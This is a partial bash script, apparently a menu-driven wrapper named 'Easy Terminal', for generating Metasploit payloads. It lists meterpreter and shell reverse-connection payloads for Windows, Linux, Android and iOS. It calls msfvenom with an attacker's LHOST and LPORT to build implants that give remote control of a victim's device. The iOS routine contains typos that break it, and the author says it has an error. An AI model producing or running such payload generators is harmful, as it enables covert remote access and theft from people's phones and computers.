...
xterm -fa monaco -fs 13 -bg black -e '''clear
...
print_menu() {
    ...
    echo "[---]       Welcome to Easy Terminal ( Version 1.5.0 Beta )       [---]"| lolcat 
...
payload_option() {
    ...
    echo $orange"|$white [01]$yellow windows/meterpreter/reverse_tcp$orange            |"

    echo $orange"|$white [02]$yellow windows/meterpreter/reverse_http$orange           |"

    echo $orange"|$white [03]$yellow windows/meterpreter/reverse_https$orange          |"

    echo $orange"|$white [04]$yellow linux/x86/meterpreter/reverse_tcp$orange          |"

    echo $orange"|$white [05]$yellow linux/x64/meterpreter/reverse_tcp$orange          |"

    echo $orange"|$white [06]$yellow android/meterpreter/reverse_tcp$orange            |"

    echo $orange"|$white [07]$yellow android/shell/reverse_tcp$orange                  |"

    echo $orange"|$white [08]$yellow android/meterpreter/reverse_http$orange           |"

    echo $orange"|$white [09]$yellow android/meterpreter/reverse_https$orange          |"

    echo $orange"|$white [10]$yellow android/meterpreter_reverse_http$orange           |"

    echo $orange"|$white [11]$yellow android/meterpreter_reverse_https$orange          |"

    echo $orange"|$white [12]$yellow android/meterpreter_reverse_tcp$orange            |"

    echo $orange"|$white [13]$yellow android/shell/reverse_http$orange                 |"

    echo $orange"|$white [14]$yellow android/shell/reverse_https$orange                |"

    echo $orange"|$white [15]$yellow android/shell/reverse_tcp$orange                  |"

    echo $orange"|$white [16]$yellow apple_ios/aarch64/meterpreter_reverse_https$orange|"

    echo $orange"|$white [17]$yellow apple_ios/aarch64/meterpreter_reverse_tcp$orange  |"

    echo $orange"|$white [18]$yellow apple_ios/aarch64/shell_reverse_tcp$orange        |"

    echo $orange"|$white [19]$yellow apple_ios/armle/meterpreter_reverse_http$orange   |"

    echo $orange"|$white [20]$yellow apple_ios/armle/meterpreter_reverse_https$orange  |"

    echo $orange"|$white [21]$yellow apple_ios/aarch64/meterpreter_reverse_http$orange |"
    ...
    case $payload_type in
        ...
        7)
            ...
            export PAYLOAD_TYPE="android/shell/reverse_tcp"

            ;;

        8)

            export PAYLOAD_TYPE="android/meterpreter/reverse_http"

            ;;

        9)

            export PAYLOAD_TYPE="android/meterpreter/reverse_https"

            ;;

        10)

            export PAYLOAD_TYPE="android/meterpreter_reverse_http"

            ;;

        11)

            export PAYLOAD_TYPE="android/meterpreter_reverse_https"

            ;;

        12)

            export PAYLOAD_TYPE="android/meterpreter_reverse_tcp"

            ;;

        13)

            export PAYLOAD_TYPE="android/shell/reverse_http"

            ;;

        14)

            export PAYLOAD_TYPE="android/shell/reverse_https"
        ...
        16)
            ...
            export PAYLOAD_TYPE="apple_ios/aarch64/meterpreter_reverse_https"

            ;;

        17)

            export PAYLOAD_TYPE="apple_ios/aarch64/meterpreter_reverse_tcp"

            ;;

        18)

            export PAYLOAD_TYPE="apple_ios/aarch64/shell_reverse_tcp"

            ;;

        19)

            export PAYLOAD_TYPE="apple_ios/armle/meterpreter_reverse_http"

            ;;

        20)

            export PAYLOAD_TYPE="apple_ios/armle/meterpreter_reverse_https"

            ;;

        21)

            export PAYLOAD_TYPE="apple_ios/aarch64/meterpreter_reverse_http"
...
android_payload() {
    ...
    echo $orange"|$white [3] $yellow android/meterpreter/reverse_http$orange     |"

    echo $orange"|$white [4] $yellow android/meterpreter/reverse_https$orange    |"

    echo $orange"|$white [5] $yellow android/meterpreter_reverse_http$orange     |"

    echo $orange"|$white [6] $yellow android/meterpreter_reverse_https$orange    |"

    echo $orange"|$white [7] $yellow android/meterpreter_reverse_tcp$orange      |"

    echo $orange"|$white [8] $yellow android/shell/reverse_http$orange           |"

    echo $orange"|$white [9] $yellow android/shell/reverse_https$orange          |"

    echo $orange"|$white [10] $yellow android/shell/reverse_tcp$orange           |"
    ...
    case $android_payload_type in
        ...
        3)
            ...
            export android_payload_type="android/meterpreter/reverse_http"

            ;;

        4)

            export android_payload_type="android/meterpreter/reverse_https"

            ;;

        5)

            export android_payload_type="android/meterpreter_reverse_http"

            ;;

        6)

            export android_payload_type="android/meterpreter_reverse_https"

            ;;

        7)

            export android_payload_type="android/meterpreter_reverse_tcp"

            ;;

        8)

            export android_payload_type="android/shell/reverse_http"

            ;;

        9)

            export android_payload_type="android/shell/reverse_https"
        ...
        *)
            ...
            echo $red "Invalid option, choose 1 or 2"
...
ios_payload() {
    ...
    echo $orange"|$white [1] $yellow apple_ios/armle/meterpreter_reverse_tcp           |"

    echo $orange"|$white [2] $yellow apple_ios/aarch64/meterpreter_reverse_https$orange|"

    echo $orange"|$white [3] $yellow apple_ios/aarch64/meterpreter_reverse_tcp$orange  |"

    echo $orange"|$white [4] $yellow apple_ios/aarch64/shell_reverse_tcp$orange        |"

    echo $orange"|$white [5] $yellow apple_ios/armle/meterpreter_reverse_http$orange   |"

    echo $orange"|$white [6] $yellow apple_ios/armle/meterpreter_reverse_https$orange  |"

    echo $orange"|$white [7] $yellow apple_ios/aarch64/meterpreter_reverse_http$orange |"
...
ios_msfvenom() {
    ...
    read -p "Enter Payload Format (e.g., \"mancho\") " format3
    ...
    echo "Please Dont Use This Again because There is an erorr i will fix it soon..."

    echo

    msfvenom -p $ios_payload_type LHOST=$H3 LPORT=$P3 --paltform Apple_iOS -f $format3 -o $S3/$name3
...
android_msfvenom() {
    ...
    read -p "Enter Payload Arch (e.g., \"dalvik\"): " A
    ...
    msfvenom -p $android_payload_type LHOST=$H4 LPORT=$P4 --platform Android -a $A -o $S4/$name4
